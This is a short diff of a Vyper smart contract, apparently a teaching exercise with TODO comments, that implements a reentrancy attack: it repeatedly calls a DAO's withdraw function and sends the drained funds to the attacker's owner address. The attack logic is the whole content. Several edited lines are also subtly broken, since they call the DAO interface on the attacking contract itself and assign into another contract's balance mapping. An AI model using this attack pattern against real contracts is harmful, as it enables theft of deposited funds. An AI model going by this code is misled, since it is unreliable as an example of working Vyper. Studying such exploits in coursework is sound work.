@@ -42,7 +42,7 @@ def attack(dao_address:address):
     # TODO: Start the reentrancy attack
     DAO(dao_address).withdraw()
     # TODO: After the recursion has finished, all the stolen funds are held by this contract. Now, you need to send all funds (deposited and stolen) to the entity that called this contract
-    send(self.owner_address, DAO(self).userBalances(msg.sender))
+    send(self.owner_address, DAO(self).userBalances[self.owner_address])
     pass
 
 @external
@@ -52,7 +52,7 @@ def __default__():
     
     # TODO: Add code here to complete the recursive call
     self.counter -=1
-    DAO(self).userBalances(self.owner_address)+=self.deposit
+    DAO(self).userBalances[self.owner_address] += self.deposit
     self._attack()
 
     pass
